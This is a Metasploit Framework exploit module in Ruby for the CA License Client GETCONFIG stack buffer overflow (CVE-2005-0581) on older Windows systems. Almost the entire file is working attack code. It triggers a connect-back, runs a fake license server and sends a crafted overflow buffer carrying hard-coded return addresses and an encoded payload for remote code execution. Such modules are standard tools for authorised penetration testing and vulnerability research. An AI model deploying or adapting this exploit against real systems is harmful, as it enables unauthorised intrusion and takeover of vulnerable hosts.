##
# $Id: calicclnt_getconfig.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Computer Associates License Client GETCONFIG Overflow',
			'Description'	=> %q{
					This module exploits an vulnerability in the CA License Client
				service. This exploit will only work if your IP address can be
				resolved from the target system point of view. This can be
				accomplished on a local network by running the 'nmbd' service
				that comes with Samba. If you are running this exploit from
				Windows and do not filter udp port 137, this should not be a
				problem (if the target is on the same network segment). Due to
				the bugginess of the software, you are only allowed one connection
				to the agent port before it starts ignoring you. If it wasn't for this
				issue, it would be possible to repeatedly exploit this bug.
			},
			'Author' =>
				[
					'Thor Doomen <syscall [at] hushmail.com>', # original msf v2 module
					'patrick', # msf v3 port :)
				],
			'License' => MSF_LICENSE,
			'Version' => '$Revision: 10394 $',
			'References'	=>
				[
					[ 'CVE', '2005-0581' ],
					[ 'OSVDB', '14389' ],
					[ 'BID', '12705' ],
					[ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=213' ],
				],
			'Privileged' => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload' =>
				{
					'Space'	=> 600,
					'BadChars' => "\x00\x20",
					'StackAdjustment' => -3500,

				},
			'Platform'	=> 'win',
			'Targets' =>
				[
					# As much as I would like to return back to the DLL or EXE,
					# all of those modules have a leading NULL in the
					# loaded @ address :(
					# name, jmp esi, writable, jmp edi
					#['Automatic', {} ],
					#
					# patrickw - tested OK Windows XP English SP0-1 only 20100214
					['Windows 2000 English',	{ 'Rets' => [ 0x750217ae, 0x7ffde0cc, 0x75021421 ] } ], # ws2help.dll esi + peb + edi
					['Windows XP English SP0-1',	{ 'Rets' => [ 0x71aa16e5, 0x7ffde0cc, 0x71aa19e8 ] } ], # ws2help.dll esi + peb + edi
					['Windows XP English SP2',	{ 'Rets' => [ 0x71aa1b22, 0x71aa5001, 0x71aa1e08 ] } ], # ws2help.dll esi + .data + edi
					['Windows 2003 English SP0',	{ 'Rets' => [ 0x71bf175f, 0x7ffde0cc, 0x71bf1a2c ] } ], # ws2help.dll esi + peb + edi
				],
			'DisclosureDate' => 'Mar 02 2005'))

		register_options(
			[
				Opt::RPORT(10203),
				OptPort.new('SRVPORT', [ true, "Fake CA License Server Port", 10202 ]),
			], self.class)
	end

	#def check
		# It is possible to check, but due to a software bug, checking prevents exploitation
	#end

	def exploit
		if (connect)
			sock.put("A0 GETSERVER<EOM>\n")
			print_status("Initial packet sent to remote agent...")
			disconnect

			fakecaservice = Rex::Socket::TcpServer.create(
				'LocalHost' => '0.0.0.0',
				'LocalPort' => datastore['SRVPORT'],
				'SSL'       => false,
				'Context'   =>
					{
						'Msf'        => framework,
						'MsfExploit' => self,
					})

			add_socket(fakecaservice)

			fakecaservice.start
			print_status("Waiting for the license agent to connect back...")
			begin
				Timeout.timeout(3) do
					done = false
					while (not done and session = fakecaservice.accept)
						print_status("Accepted connection from agent #{Rex::Socket.source_address(rhost)}..")
						session.put("A0 GETCONFIG SELF 0<EOM>")
						req = session.recvfrom(2000)[0]
						next if not req
						next if req.empty?

						if (req =~ /OS\<([^\>]+)/)
							print_status("Target reports OS: #{$1}")
						end

						# exploits two different versions at once >:-)
						# 144 -> return address of esi points to string middle
						# 196 -> return address of edi points to string beginning
						# 148 -> avoid exception by patching with writable address
						# 928 -> seh handler (not useful under XP SP2)
						buff = rand_text_alphanumeric(900)
						buff[142, 2] = Rex::Arch::X86.jmp_short(8) 		# jmp over addresses
						buff[144, 4] = [target['Rets'][0]].pack('V') 		# jmp esi
						buff[148, 4] = [target['Rets'][1]].pack('V')		# writable address
						buff[194, 2] = Rex::Arch::X86.jmp_short(4)		# jmp over address
						buff[196, 4] = [target['Rets'][2]].pack('V')		# jmp edi
						buff[272, payload.encoded.length] = payload.encoded

						sploit = "A0 GETCONFIG SELF #{buff}<EOM>"
						session.put(sploit)
						session.close
					end
				end
			ensure
				handler
				fakecaservice.close
				return
			end
		end
	end

end

=begin
eTrust: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.2>OLFFILE<0 0 0>SERVER<RMT>VERSION<0 1.61.0>NETWORK<192.168.3.22 unknown 255.255.255.0>MACHINE<PC_686_1_2084>CHECKSUMS<0 0 0 0 0 0 0 00 0 0 0>RMTV<1.3.1><EOM>
BrightStor: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.1>OLFFILE<0 0 0>SERVER<RMT>VERSION<3 1.54.0>NETWORK<11.11.11.111 unknown 255.255.255.0>MACHINE<DESKTOP>CHECKSUMS<0 0 0 0 0 0 0 0 0 0 0 0>RMTV<1.00><EOM>
lic98rmt.exe v0.1.0.15: A0 GCR HOSTNAME<XXX>HARDWARE<xxxxxx>LOCALE<English>IDENT1<unknown>IDENT2<unknown>IDENT3<unknown>IDENT4<unknown>OS<Windows_NT 5.1>OLFFILE<0 0 0>SERVER<RMT>VERSION<3 1.61.0>NETWORK<192.168.139.128 unknown 255.255.255.0>MACHINE<DESKTOP>CHECKSUMS<0 0 0 0 0 0 0 0 0 0 0 0>RMTV<1.00><EOM>
=end

